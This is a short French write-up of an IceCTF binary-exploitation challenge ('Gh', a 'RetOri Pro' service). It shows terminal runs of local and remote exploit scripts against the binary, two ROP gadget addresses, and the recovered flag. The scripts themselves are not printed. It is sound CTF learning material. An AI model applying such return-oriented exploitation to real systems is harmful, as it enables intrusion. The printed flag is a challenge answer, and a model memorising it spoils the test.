On trouve dans cette archive
* un source.c donnant le pseudo code des processus (merci Hopper)
* le binaire Gh
* 2 fichiers pile.py, pile2.py et pile3.py faisant le chall en local:
Le fichier flag.txt contient YES:

francois@athos:~/tmp/Gh/C2$ python pile.py | ./Gh
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] aperto
[+] leggi
Erreur de segmentation
francois@athos:~/tmp/Gh/C2$ python pile2.py | ./Gh
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] aperto
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] leggi
[+] stampare
YES
Erreur de segmentation
francois@athos:~/tmp/Gh/C2$ python pile3.py | ./Gh
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] aperto
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] leggi
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] stampare
YES
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
francois@athos:~/tmp/Gh/C2$ 


Le fichier pile2.py contient les explications.
Les gadgets utilisés sont
0x08048395 : pop ebx ; ret
0x080486ee : pop edi ; pop ebp ; ret

p.py est l'adaptation du challenge en remote.
francois@athos:~/tmp/Gh/C2$ python p.py
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?

[+] aperto

Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?

[+] leggi
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?

[+] stampare
IceCTF{italiano_ha_portato_a_voi_da_google_tradurre}
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?

francois@athos:~/tmp/Gh/C2$ 

Le flag est «IceCTF{italiano_ha_portato_a_voi_da_google_tradurre}»
